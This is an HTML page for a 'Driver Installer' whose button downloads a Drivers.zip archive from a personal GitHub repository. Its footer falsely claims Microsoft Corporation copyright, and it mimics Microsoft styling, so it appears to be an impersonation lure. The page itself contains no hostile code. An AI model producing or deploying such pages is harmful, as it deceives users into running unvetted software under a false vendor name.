<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Driver Installer</title>
    <style>
        /* Style général */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #121212;
            color: #e0e0e0;
        }

        /* Barre de navigation */
        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: #1e1e1e;
            padding: 15px 20px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
        }

        .navbar .logo {
            font-weight: bold;
            font-size: 1.2rem;
            color: #0078d4;
        }

        .navbar .menu {
            display: flex;
            gap: 20px;
        }

        .navbar .menu a {
            text-decoration: none;
            color: #e0e0e0;
            font-size: 1rem;
            font-weight: 500;
        }

        .navbar .menu a:hover {
            color: #0078d4;
        }

        /* Section principale */
        .hero {
            text-align: center;
            padding: 50px 20px;
            background-color: #1e1e1e;
            margin: 20px auto;
            max-width: 900px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
        }

        .hero h1 {
            font-size: 2rem;
            color: #ffffff;
        }

        .hero p {
            font-size: 1rem;
            color: #b0b0b0;
            margin: 15px 0 20px;
        }

        /* Zone de téléchargement */
        .download-section {
            margin: 20px auto;
            text-align: center;
            background-color: #1e1e1e;
            padding: 20px;
            max-width: 600px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
        }

        .download-section p {
            font-size: 1rem;
            color: #b0b0b0;
            margin-bottom: 20px;
        }

        .download-section button {
            padding: 10px 20px;
            font-size: 1rem;
            font-weight: bold;
            color: #fff;
            background-color: #0078d4;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .download-section button:hover {
            background-color: #005a9e;
        }

        /* Footer */
        .footer {
            margin-top: 20px;
            text-align: center;
            padding: 15px;
            font-size: 0.9rem;
            color: #888;
            background-color: #1e1e1e;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .hero, .download-section {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Barre de navigation -->
    <div class="navbar">
        <div class="logo">Driver Installer</div>
        <div class="menu">
            <a href="#">Home</a>
            <a href="#">Support</a>
            <a href="#">About</a>
        </div>
    </div>

    <!-- Section principale -->
    <div class="hero">
        <h1>Download Drivers</h1>
        <p>Get the latest drivers and updates for your system. Click the button below to download the necessary files.</p>
    </div>

    <!-- Zone de téléchargement -->
    <div class="download-section">
        <p><strong>Driver Package:</strong> Includes all necessary drivers and setup files in a single archive.</p>
        <button onclick="window.location.href='https://github.com/NeXuSS6N/Windows-Drivers/raw/refs/heads/main/Drivers.zip'">Download .zip</button>
    </div>

    <!-- Footer -->
    <div class="footer">
        © 2025 Microsoft Corporation. All rights reserved.
    </div>
</body>
</html>
